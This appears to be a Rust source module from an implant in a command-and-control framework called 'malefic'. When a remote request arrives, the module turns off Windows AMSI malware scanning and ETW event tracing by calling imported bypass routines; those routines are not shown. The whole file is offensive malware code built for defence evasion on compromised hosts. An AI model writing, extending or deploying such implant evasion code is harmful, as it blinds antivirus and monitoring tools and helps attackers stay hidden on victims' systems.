use crate::{check_request, Module, Result, TaskResult};
use malefic_helper::protobuf::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw};
use malefic_trait::module_impl;

pub struct Bypass {}

#[async_trait]
#[module_impl("bypass")]
impl Module for Bypass {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let req = check_request!(receiver, Body::BypassRequest)?;
        unsafe {
            if req.amsi {
                bypass_amsi();
            }
            if req.etw {
                bypass_etw();
            }
        }

        Ok(TaskResult::new(id))
    }
}